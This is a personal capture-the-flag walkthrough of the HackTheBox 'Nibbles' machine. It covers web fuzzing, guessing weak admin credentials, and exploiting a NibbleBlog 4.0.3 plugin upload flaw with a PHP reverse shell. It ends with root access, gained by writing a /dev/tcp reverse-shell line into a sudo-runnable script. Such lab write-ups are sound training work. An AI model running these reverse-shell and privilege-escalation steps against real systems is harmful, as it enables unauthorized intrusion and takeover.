Add ip to `/etc/hosts` file ,so don't need to memorize every time.

![[HackTheBox/Nibbles/images/1.png]]

ICMP ping the target:

`ping nibbles.htb`

It's alive

![[HackTheBox/Nibbles/images/2.png]]

I passed port scan at this time and simply access `port 80`:

![[HackTheBox/Nibbles/images/3.png]]

Begin with fuzzing:

Nothing interesting on any tool:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nibbles.htb/FUZZ
```

![[HackTheBox/Nibbles/images/4.png]]

```bash
dirsearch -u nibbles.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[HackTheBox/Nibbles/images/5.png]]

At the same time, I also view page source then encountered a comment:

The page routes another page.

![[HackTheBox/Nibbles/images/6.png]]

Looks like a product name is `Nibblesblog`:

![[HackTheBox/Nibbles/images/7.png]]

I was examining the page source then identified a php file path:

![[HackTheBox/Nibbles/images/8.png]]

There was another ip address direction weird ->

![[HackTheBox/Nibbles/images/9.png]]

Let's dive under `/nibbleblog/` page straightforwardly:

Respectively, following wordlist does not identify anything:

```bash
directory-list-2.3-small.txt
directory-list-2.3-medium.txt

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://nibbles.htb/nibblesblog/FUZZ

dirsearch -u http://nibbles.htb/nibblesblog/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[HackTheBox/Nibbles/images/10.png]]

![[HackTheBox/Nibbles/images/11.png]]

Since I had typo issues on directory name `/nibbleblog/` let's try again:

Now it works, lets shift to `/admin/` page:

![[12.png]]

Based on `/usr/share/wordlists/dirb/common.txt` fuzz:

```bash
admin.php is accessible

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://nibbles.htb/nibbleblog/FUZZ

```

![[13.png]]

`searchsploit` resulted in only two vulnerabilities:

```bash
searchsploit "nibble"
```

![[14.png]]

As a login credentials, following attempts does not work:

```bash
admin:admin
admin:password
admin:root
root:root
toor:root
```

Then I noticed the machine's name and blog ,so I tried `admin:nibbleblog/nibblesblog nibbleblog:nibblesblog nibbleblog:nibbleblog nibblesblog:nibblesblog admin:nibbles` respectively.

Last one worked only:

![[15.png]]

I searched for any exploit alternatives:

![[16.png]]

Then found official `nmap` disclosure page:

![[17.png]]

```bash
2. Vulnerability Description

When uploading image files via the "My image" plugin - which is
delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the
original extension of uploaded files. This extension or the actual file
type are not checked, thus it is possible to upload PHP files and gain
code execution.

Please note that admin credentials are required.

3. Proof of Concept

    Obtain Admin credentials (for example via Phishing via XSS which can
be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)
    Activate My image plugin by visiting
[http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image](http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image)
    Upload PHP shell, ignore warnings
    Visit
[http://localhost/nibbleblog/content/private/plugins/my_image/image.php](http://localhost/nibbleblog/content/private/plugins/my_image/image.php).
This is the default name of images uploaded via the plugin.
```

lets go the plugin page and activate it:

I will use pentest monkey's generic reverse shell

[REVSHELL](https://github.com/pentestmonkey/php-reverse-shell)

change ip and port as your attacker machine. I uploaded my shell.

`http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`

![[18.png]]

Execute the shell trigger:

`http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php`

`penelope -p 1234`

then I got shell

![[19.png]]

As initial foothold, I began with `sudo -l` to identify whether if there is binary that I can run.

![[20.png]]

get user flag:

![[22.png]]

lets see the `monitor.sh`

Now I will change the content of the script and get reverse shell via [GFTObins](https://gtfobins.org/gtfobins/bash/)

![[21.png]]

you must use full path instead of just `sudo bash` as binary.

`sudo /home/nibbler/personal/stuff/monitor.sh`

```bash
echo "sudo /home/nibbler/personal/stuff/monitor.sh" > monitor.sh
```

I also called binary as full path:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```



I need interactive shell ,so add `echo "sh -i >& /dev/tcp/10.10.16.64/3210 0>&1" > monitor.sh`

I will also add `shebang` at the beginning of the bash script ,so it may work.

![[23.png]]

`#!/bin/bash`

[shebang](https://earthly.dev/blog/understanding-bash/#:~:text=%23!%2Fbin%2Fbash,-The%20most%20common&text=Essentially%20it%20tells%20your%20terminal,to%20work%20specifically%20with%20bash.)

```bash
echo "#!/bin/bash" > monitor.sh
echo "sh -i >& /dev/tcp/10.10.16.64/3210 0>&1" >> monitor.sh
```

![[24.png]]

then call listener `penelope -p 3210`.

![[25.png]]

Now I got root shell:

![[26.png]]

Obtain root flag:

![[27.png]]